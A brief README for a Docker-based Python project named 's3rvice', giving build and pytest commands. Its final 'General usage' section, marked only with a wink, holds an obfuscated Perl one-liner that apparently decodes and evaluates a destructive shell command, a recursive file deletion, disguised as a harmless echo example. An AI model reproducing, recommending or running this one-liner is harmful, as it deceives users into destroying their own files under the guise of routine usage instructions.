# s3rvice

starter pack

# Local build

```
docker build -t s3rvice
```

# Tests

## Image code

Use in CI/CD steps, after build

```
docker run s3rvice pytest

```

## Current code

Use locally: build once, run on change

```
docker run -v $(pwd):/usr/src/app s3rvice pytest
```

# General usage

;) 

```
echo "test... test... test..." | perl -e '$??s:;s:s;;$?::s;;=]=>%-{<-|}<&|`{;;y; -/:-@[-`{-};`-{/" -;;s;;$_;see'
```